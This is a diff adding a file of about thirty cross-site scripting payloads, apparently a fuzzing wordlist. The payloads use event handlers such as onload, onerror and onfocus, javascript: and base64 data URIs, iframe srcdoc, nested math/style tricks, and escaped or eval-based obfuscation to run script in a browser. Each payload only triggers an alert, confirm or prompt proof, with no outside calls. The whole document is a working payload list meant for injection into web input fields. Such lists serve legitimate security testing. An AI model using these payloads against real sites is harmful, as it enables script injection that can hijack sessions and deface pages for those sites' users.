@@ -1,0 +1,31 @@
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe/src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=confirm('XSS')>
+<img src=x onerror=prompt('XSS')>
+<svg/onload=confirm(1)>
+<svg/onload=prompt(1)>
+<body/onload=alert(1)>
+<div onmouseover=alert(1)>Hover me</div>
+<input onfocus=alert(1) autofocus>
+<details/ontoggle=alert(1)>click me</details>
+<select/onchange=alert(1)><option>1</option><option>2</option></select>
+<form><button formaction=javascript:alert(1)>Click</button></form>
+<a href="javascript:alert(1)">Click me</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click me</a>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<math><mtext><option><style><script>alert(1)</script></style></option></mtext></math>
+<x onclick=alert(1) src=a>Click me</x>
+<video><source onerror="javascript:alert(1)"></video>
+<audio src=x onerror=alert(1)>
+<input type="image" src=x onerror=alert(1)>
+<isindex formaction=javascript:alert(1) type=submit>
+<script>\u0061lert(1)</script>
+<script>eval('\x61lert(1)')</script>
+<script>setTimeout('alert(1)',0)</script>
+<img src=x:alert(1) onerror=eval(src)>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
